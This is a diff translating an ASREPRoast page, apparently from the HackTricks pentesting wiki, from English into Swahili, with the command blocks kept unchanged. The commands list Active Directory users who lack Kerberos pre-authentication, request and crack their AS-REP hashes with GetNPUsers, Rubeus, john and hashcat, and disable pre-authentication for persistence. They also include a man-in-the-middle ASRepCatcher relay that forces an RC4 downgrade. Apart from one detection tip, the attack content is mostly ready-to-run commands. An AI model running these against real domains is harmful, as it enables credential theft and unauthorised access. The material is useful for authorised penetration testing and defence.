@@ -19,16 +19,15 @@ Stay informed with the newest bug bounties launching and crucial platform update
 
 ## ASREPRoast
 
-ASREPRoast is a security attack that exploits users who lack the **Kerberos pre-authentication required attribute**. Essentially, this vulnerability allows attackers to request authentication for a user from the Domain Controller (DC) without needing the user's password. The DC then responds with a message encrypted with the user's password-derived key, which attackers can attempt to crack offline to discover the user's password.
+ASREPRoast ni shambulio la usalama linalotumia watumiaji ambao hawana **sifa ya awali ya uthibitisho ya Kerberos**. Kimsingi, udhaifu huu unaruhusu washambuliaji kuomba uthibitisho kwa mtumiaji kutoka kwa Domain Controller (DC) bila kuhitaji nenosiri la mtumiaji. DC kisha inajibu kwa ujumbe uliofungwa kwa kutumia ufunguo uliochukuliwa kutoka kwa nenosiri la mtumiaji, ambao washambuliaji wanaweza kujaribu kuuvunja nje ya mtandao ili kugundua nenosiri la mtumiaji.
 
-The main requirements for this attack are:
+Mahitaji makuu ya shambulio hili ni:
 
-- **Lack of Kerberos pre-authentication**: Target users must not have this security feature enabled.
-- **Connection to the Domain Controller (DC)**: Attackers need access to the DC to send requests and receive encrypted messages.
-- **Optional domain account**: Having a domain account allows attackers to more efficiently identify vulnerable users through LDAP queries. Without such an account, attackers must guess usernames.
+- **Ukosefu wa awali ya uthibitisho ya Kerberos**: Watumiaji wa lengo hawapaswi kuwa na kipengele hiki cha usalama kimewezeshwa.
+- **Muunganisho na Domain Controller (DC)**: Washambuliaji wanahitaji ufikiaji wa DC ili kutuma maombi na kupokea ujumbe uliofungwa.
+- **Akaunti ya kikoa ya hiari**: Kuwa na akaunti ya kikoa kunawawezesha washambuliaji kutambua kwa ufanisi watumiaji walio hatarini kupitia maswali ya LDAP. Bila akaunti kama hiyo, washambuliaji lazima wahakikishe majina ya watumiaji.
 
 #### Enumerating vulnerable users (need domain credentials)
-
 ```bash:Using Windows
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
@@ -36,9 +35,7 @@ Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```bash:Using Linux
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
-
-#### Request AS_REP message
-
+#### Omba ujumbe wa AS_REP
 ```bash:Using Linux
 #Try all the usernames in usernames.txt
 python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
@@ -50,21 +47,17 @@ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashc
 .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
 ```
-
 > [!WARNING]
-> AS-REP Roasting with Rubeus will generate a 4768 with an encryption type of 0x17 and preauth type of 0.
+> AS-REP Roasting na Rubeus itazalisha 4768 yenye aina ya usimbaji 0x17 na aina ya preauth 0.
 
-### Cracking
-
+### Kupasua
 ```bash
 john --wordlist=passwords_kerb.txt hashes.asreproast
 hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
-
 ### Persistence
 
-Force **preauth** not required for a user where you have **GenericAll** permissions (or permissions to write properties):
-
+Lazimisha **preauth** isiyohitajika kwa mtumiaji ambapo una ruhusa za **GenericAll** (au ruhusa za kuandika mali):
 ```bash:Using Windows
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
@@ -72,12 +65,10 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 ```bash:Using Linux
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
 ```
+## ASREProast bila hati
 
-## ASREProast without credentials
-
-An attacker can use a man-in-the-middle position to capture AS-REP packets as they traverse the network without relying on Kerberos pre-authentication being disabled. It therefore works for all users on the VLAN.\
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) allows us to do so. Moreover, the tool forces client workstations to use RC4 by altering the Kerberos negotiation.
-
+Mshambuliaji anaweza kutumia nafasi ya mtu katikati kukamata pakiti za AS-REP wakati zinapita kwenye mtandao bila kutegemea kuondolewa kwa awali ya uthibitishaji wa Kerberos. Hivyo inafanya kazi kwa watumiaji wote kwenye VLAN.\
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) inatupa uwezo wa kufanya hivyo. Zaidi ya hayo, chombo hiki kinawalazimisha vituo vya wateja kutumia RC4 kwa kubadilisha mazungumzo ya Kerberos.
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
@@ -88,8 +79,7 @@ ASRepCatcher relay -dc $DC_IP --disable-spoofing
 # Passive listening of AS-REP packets, no packet alteration
 ASRepCatcher listen
 ```
-
-## References
+## Marejeo
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
 
@@ -97,18 +87,17 @@ ASRepCatcher listen
 
 <figure><img src="../../images/image (3).png" alt=""><figcaption></figcaption></figure>
 
-Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
+Jiunge na [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server ili kuwasiliana na hackers wenye uzoefu na wawindaji wa makosa!
 
-**Hacking Insights**\
-Engage with content that delves into the thrill and challenges of hacking
+**Mawazo ya Udukuzi**\
+Shiriki na maudhui yanayoangazia msisimko na changamoto za udukuzi
 
-**Real-Time Hack News**\
-Keep up-to-date with fast-paced hacking world through real-time news and insights
+**Habari za Udukuzi kwa Wakati Halisi**\
+Endelea kuwa na habari kuhusu ulimwengu wa udukuzi kwa wakati halisi kupitia habari na mawazo
 
-**Latest Announcements**\
-Stay informed with the newest bug bounties launching and crucial platform updates
+**Matangazo Mapya**\
+Baki na habari kuhusu makosa mapya yanayoanzishwa na masasisho muhimu ya jukwaa
 
-**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
+**Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) na uanze kushirikiana na hackers bora leo!
 
 {{#include ../../banners/hacktricks-training.md}}
-
